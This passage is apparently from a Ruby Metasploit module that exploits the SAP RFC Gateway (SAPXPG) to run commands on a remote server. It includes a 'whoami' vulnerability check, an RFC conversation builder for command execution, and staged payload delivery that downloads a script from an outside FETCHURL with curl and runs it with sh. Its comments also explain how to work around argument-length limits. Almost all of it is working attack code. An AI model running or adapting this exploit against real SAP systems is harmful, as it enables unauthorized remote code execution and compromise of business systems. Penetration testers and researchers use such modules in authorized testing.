  # Utility
  # ========================================================================

  def get_local_ip(target_ip)
    s = UDPSocket.new
    s.connect(target_ip, 1)
    addr = s.addr.last
    s.close
    addr
  rescue StandardError
    '127.0.0.1'
  end

  # ========================================================================
  # Check
  # ========================================================================

  def check
    begin
      if datastore['PROTOCOL'] == 'modern'
        print_warning(
          "Modern protocol constraints: payload auto-execution is disabled, " \
          "ARGS max is #{MAX_ARGS_LEN} chars, and longer commands require FETCHURL."
        )
      end

      output = execute_single_cmd('whoami')
      if output && !output.strip.empty?
        vprint_good("Command output: #{output.strip}")
        return CheckCode::Vulnerable("Got command output: #{output.strip}")
      end
      CheckCode::Detected
    rescue ::Rex::ConnectionError, ::Rex::ConnectionRefused, ::Rex::HostUnreachable => e
      vprint_error("Connection failed: #{e}")
      CheckCode::Unknown
    rescue StandardError => e
      vprint_error("Error: #{e}")
      CheckCode::Unknown
    end
  end

  # ========================================================================
  # Single-command execution (one full P1-P4 RFC conversation per call)
  # ========================================================================

  # Maximum args length in the modern ARGS template.
  # The RFC serialization format at byte 1492-1493 uses a counter encoding
  # that cannot represent args longer than the template's original 11 bytes.
  # Exhaustive testing confirmed that args_delta > 0 ALWAYS causes
  # "connection to partner '127.0.0.1:0' broken" regardless of counter
  # adjustments. The program name (EXTPROG) can grow freely (cmd_delta > 0).
  MAX_ARGS_LEN = 11

  # Check if a command string fits safely in the template
  def cmd_fits_template?(cmd_str)
    parts = cmd_str.split(' ', 2)
    program = parts[0]
    args = parts[1] || ''

    # NOARGS path: single word <= 6 chars, always safe (zero delta)
    return true if args.empty? && program.length <= 6

    # ARGS path: program can be any length, but args MUST be <= 11 bytes
    args.length <= MAX_ARGS_LEN
  end

  # Execute a single command via a fresh RFC conversation (P1-P4).
  # Opens and closes its own TCP connection.
  # Returns command output string or nil.
  def execute_single_cmd(cmd_str)
    protocol = datastore['PROTOCOL']
    target_ip = datastore['RHOST']
    target_port = datastore['RPORT']
    sid = resolve_sid(protocol)
    appserver = resolve_appserver(protocol)
    instance = resolve_instance(target_port)
    client_ip = get_local_ip(target_ip)

    connect

    begin
      # P1: GW_NORMAL_CLIENT
      ni_send(build_gw_init(client_ip, instance))
      ni_recv

      # P2: F_SAP_INIT
      if protocol == 'legacy'
        p2 = build_sap_init_npl(client_ip, target_ip, sid)
      else
        p2 = build_sap_init(client_ip, target_ip, sid)
      end
      ni_send(p2)
      resp = ni_recv_handle_ping

      err = check_response_error(resp)
      fail_with(Failure::UnexpectedReply, "INIT error: #{err}") if err

      conv_id, pte = extract_p2_info(resp)
      vprint_status("Conv #{conv_id}, PTE=#{pte.unpack1('H*')}")

      # P3: SAPXPG_START_XPG_LONG
      if protocol == 'legacy'
        p3 = build_sap_send_start_npl(conv_id, cmd_str, pte, sid, appserver, client_ip, target_ip)
      else
        p3 = build_sap_send_start(conv_id, cmd_str, pte, sid, appserver)
      end
      ni_send(p3)
      start_resp = ni_recv_handle_ping

      err = check_response_error(start_resp)
      if err
        print_error("START error: #{err}")
        return nil
      end

      # P4: SAPXPG_END_XPG
      if protocol == 'legacy'
        p4 = build_sap_send_end_npl(conv_id, pte)
      else
        p4 = build_sap_send_end(conv_id, pte)
      end
      ni_send(p4)
      end_resp = ni_recv_handle_ping

      err = check_response_error(end_resp)
      print_warning("END warning: #{err}") if err

      extract_output(end_resp)
    ensure
      disconnect
    end
  end

  # ========================================================================
  # Staged payload delivery via curl fetch-and-execute
  # ========================================================================

  # Execute a command via sh -c with a single-token shell command.
  # The shell command MUST NOT contain spaces (SAPXPG splits on spaces).
  # Max shell_cmd length: 8 chars (args = "-c " + 8 = 11 bytes).
  def execute_sh_redirect(shell_cmd)
    fail_with(Failure::BadConfig, "Shell command too long (#{shell_cmd.length} > 8)") if shell_cmd.length > 8
    fail_with(Failure::BadConfig, 'Shell command must not contain spaces') if shell_cmd.include?(' ')
    execute_single_cmd("sh -c #{shell_cmd}")
  end

  # Deliver and execute a payload via curl + sh.
  # Uses FETCHURL (user-provided short URL) to download a shell script,
  # save it to a temp file, execute with sh, then cleanup.
  #
  # Constraints:
  #   curl -of URL  →  args = "-of " + URL  (4 + URL.length <= 11)
  #   So URL must be <= 7 chars (e.g., short hostname like "a.bc/x")
  #
  # For the legacy/NPL protocol, there are no length constraints and
  # this method is not needed.
  def deliver_payload_via_fetch(payload_cmd)
    fetch_url = datastore['FETCHURL']
    if fetch_url.nil? || fetch_url.empty?
      fail_with(Failure::BadConfig,
        "FETCHURL required for commands exceeding the 11-byte args limit. " \
        "Host your payload script on a short URL (max 7 chars, e.g. 'a.bc/x') " \
        "and set FETCHURL to that URL. The script should contain: #{payload_cmd[0, 60]}...")
    end

    if fetch_url.length > 7
      fail_with(Failure::BadConfig,
        "FETCHURL '#{fetch_url}' is too long (#{fetch_url.length} chars, max 7). " \
        "Use a short hostname/DNS record or URL shortener.")
    end

    tmpfile = Rex::Text.rand_text_alpha_lower(1) # single char filename

    # Step 1: Download payload script via curl
    curl_args = "-o#{tmpfile} #{fetch_url}"
    print_status("Downloading payload: curl #{curl_args}")
    output = execute_single_cmd("curl #{curl_args}")
    vprint_status("curl output: #{output}") if output

    # Step 2: Execute the downloaded script
    print_status("Executing payload: sh #{tmpfile}")
    output = execute_single_cmd("sh #{tmpfile}")

    # Step 3: Cleanup
    vprint_status('Cleaning up temp file')
    execute_single_cmd("rm #{tmpfile}")

    output
  end

  # ========================================================================
  # Exploit
  # ========================================================================

  def exploit
    target_ip = datastore['RHOST']
    target_port = datastore['RPORT']
    protocol = datastore['PROTOCOL']
    sid = resolve_sid(protocol)
    appserver = resolve_appserver(protocol)

    # Determine command to execute
    cmd = datastore['CMD']
    if (cmd.nil? || cmd.empty?) && protocol == 'modern'
      fail_with(
        Failure::BadConfig,
        'Modern protocol payload execution is disabled due SAP ARGS constraints. ' \
        'Set CMD explicitly (or use FETCHURL for staged delivery).'
      )
    end

    if cmd.nil? || cmd.empty?
      cmd = payload.encoded
    end
    fail_with(Failure::BadConfig, 'No command or payload specified') if cmd.nil? || cmd.empty?

    validate_modern_command!(cmd, protocol)

    print_status("Target: #{target_ip}:#{target_port} (#{protocol}, SID=#{sid}, AppServer=#{appserver})")
    print_status("Command: #{cmd}")

    if cmd_fits_template?(cmd)
      # Command fits directly in a single RFC conversation
      print_status('Sending command via single RFC conversation...')
      output = execute_single_cmd(cmd)
    elsif protocol == 'legacy'
      # Legacy/NPL protocol uses fixed-size fields (EXTPROG=256B, PARAMS=510B)
      # and supports arbitrary command lengths without counter patching.
      print_status('Sending command via legacy NPL template (no length restriction)...')
      output = execute_single_cmd(cmd)
    else
      # Modern protocol: args limited to 11 bytes. Try staged delivery.
      print_warning(
        "Command args exceed 11-byte limit for modern SAP protocol. " \
        "The ARGS template RFC serialization cannot encode args > 11 bytes."
      )

      # Check if we can use FETCHURL for staged delivery
      fetch_url = datastore['FETCHURL']
      if fetch_url && !fetch_url.empty?
        print_status('Attempting staged delivery via FETCHURL...')
        output = deliver_payload_via_fetch(cmd)
      else
        # Provide actionable guidance
        print_error(
          "Cannot execute this command directly. Options:\n" \
          "  1. Use a shorter command (program can be any length, args must be <= 11 bytes)\n" \
          "  2. Set FETCHURL to a short URL (max 7 chars) hosting a shell script\n" \
          "     with your payload, then re-run. Example: set FETCHURL a.bc/x\n" \
          "  3. Use 'set CMD \"sh -c CMD\"' where CMD is a single-token (no spaces)\n" \
          "     shell command of up to 8 chars (e.g., 'sh -c id>file')\n" \
          "  4. Use the 'legacy' PROTOCOL if the target supports NW7.52 (no length limit)\n" \
          "  5. Manually chain commands: write to file with 'sh -c id>f', execute with 'sh f'"
        )
        fail_with(Failure::BadConfig,
          "Command too long for modern protocol (args=#{cmd.split(' ', 2)[1]&.length || 0} bytes, max=#{MAX_ARGS_LEN}). " \
          "Set FETCHURL or use a shorter command.")
      end
    end

    if output && !output.strip.empty?
      print_good('Command output:')
      output.strip.each_line { |l| print_line("  #{l.rstrip}") }
      store_loot(
        'sap.rfc.output',
        'text/plain',
        target_ip,
        output.strip,
        'sap_rfc_cmd_output.txt',
        'SAP RFC Gateway command output'
      )
    else
      print_status('No output captured (payload may be executing in background)')
    end

    print_good('Exploit completed successfully')
  end

  private

  def cmd_parts(cmd)
    parts = cmd.split(' ', 2)
    [parts[0], parts[1] || '']
  end

  def validate_modern_command!(cmd, protocol)
    return if protocol != 'modern'

    program, args = cmd_parts(cmd)
    args_len = args.length
    return if args_len <= MAX_ARGS_LEN

    fetch_url = datastore['FETCHURL']
    return if fetch_url && !fetch_url.empty?

    fail_with(
      Failure::BadConfig,
      "Command too long for modern protocol: program='#{program}' args_len=#{args_len} (max #{MAX_ARGS_LEN}). " \
      'Use a shorter CMD, or set FETCHURL for staged delivery.'
    )
  end

  def resolve_sid(protocol)
    sid = datastore['SID']
    if sid.nil? || sid.empty?
      protocol == 'legacy' ? 'NPL' : 'A4H'
    else
      sid[0, 3].upcase
    end
  end

  def resolve_appserver(protocol)
    appserver = datastore['APPSERVER']
    if appserver.nil? || appserver.empty?
      protocol == 'legacy' ? 'npl-sxpg' : 'vhcala4hci'
    else
      appserver
    end
  end

  def resolve_instance(port)
    if datastore['INSTANCE']
      format('%02d', datastore['INSTANCE'])
    elsif port >= 3300 && port < 3400
      format('%02d', port - 3300)
    else
      '00'
    end
  end
